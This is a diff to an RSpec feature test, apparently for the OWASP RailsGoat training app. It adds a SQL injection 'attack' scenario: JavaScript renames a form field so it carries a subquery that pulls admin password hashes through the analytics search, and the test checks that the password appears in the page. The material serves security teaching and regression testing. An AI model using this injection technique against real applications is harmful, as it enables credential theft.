@@ -1,7 +1,7 @@
 require 'spec_helper'
 
 feature 'sql injection' do
-  before do
+  before(:each) do
     UserFixture.reset_all_users
     @normal_user = UserFixture.normal_user
     @admin_user = User.where("admin='t'").first
@@ -27,5 +27,25 @@ feature 'sql injection' do
     @admin_user = User.where("admin='t'").first
     expect(@admin_user.email).to eq('joe.admin@schmoe.com')
     expect(@admin_user.admin).to eq(true)
+  end
+
+  scenario "attack\nTutorial: https://github.com/OWASP/railsgoat/wiki/A1-SQL-Injection-Interpolation", js: true do
+    login(@normal_user)
+    Analytics.create!(ip_address: "::1")
+
+    visit "/admin/1/analytics"
+
+    within('#analytics_search') do
+      fill_in 'ip', :with => '::1'
+      check "field_user_agent"
+      payload = "(select group_concat(password) from users where admin='t')"
+
+      page.execute_script "$('#field_user_agent').attr('name', \"field[#{payload}]\");"
+      page.execute_script "$('#analytics_search').submit();"
+    end
+
+    pending if verifying_fixed?
+    expect(page).to have_css(".dataTable.custom")
+    expect(page.source).to include(@admin_user.password)
   end
 end
